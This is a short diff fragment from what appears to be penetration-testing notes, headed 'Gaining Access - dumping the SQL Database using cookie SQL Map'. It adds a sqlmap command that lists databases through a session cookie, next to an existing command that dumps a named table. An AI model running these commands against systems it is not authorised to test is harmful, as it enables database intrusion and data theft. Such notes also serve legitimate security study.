@@ -7,4 +7,5 @@ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.
 
 
 **Gaining Access - dumping the SQL Database using cookie SQL Map**
+sqlmap -u "URL" --cookie="PHPSESSID=1234" --dbs
 sqlmap -u "TARGET_URL" --cookie="SESSION_COOKIE" -D DATABASE_NAME -T TABLE_NAME --dump
